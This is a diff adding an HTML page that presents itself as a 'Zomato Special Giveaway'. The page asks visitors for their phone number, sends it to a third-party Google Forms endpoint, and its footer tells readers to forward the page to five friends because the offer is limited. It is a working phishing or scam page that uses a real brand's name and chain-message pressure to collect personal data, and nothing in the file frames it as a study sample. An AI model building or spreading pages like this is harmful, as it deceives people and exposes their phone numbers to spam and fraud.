@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Check Local Kitchen Deal</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f4f4f4;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      color: #D32F2F;
+      margin-bottom: 1rem;
+    }
+    p {
+      color: #555;
+      margin-bottom: 1.5rem;
+    }
+    input[type="tel"] {
+      width: 100%;
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background: #D32F2F;
+      color: #fff;
+      padding: 0.75rem;
+      width: 100%;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #B71C1C;
+    }
+    .footer {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🍽️ Zomato Special Giveaway</h1>
+    <p>Find restaurant with discounts. Enter your number to see if you're eligible!</p>
+    <form
+      action="https://docs.google.com/forms/d/e/1FAIpQLSeLsFFyo8iQpv5TWP7l-TcM6LO7UGlgAwZeeSJvM7bX83-C-A/formResponse"
+      method="POST"
+      target="_blank"
+    >
+      <input
+        type="tel"
+        name="entry.1166974658"
+        placeholder="Enter your phone number"
+        required
+      />
+      <button type="submit">Claim Your Deal</button>
+    </form>
+    <div class="footer">
+      Forward this to 5 friends — offers valid for limited users only!
+    </div>
+  </div>
+</body>
+</html>
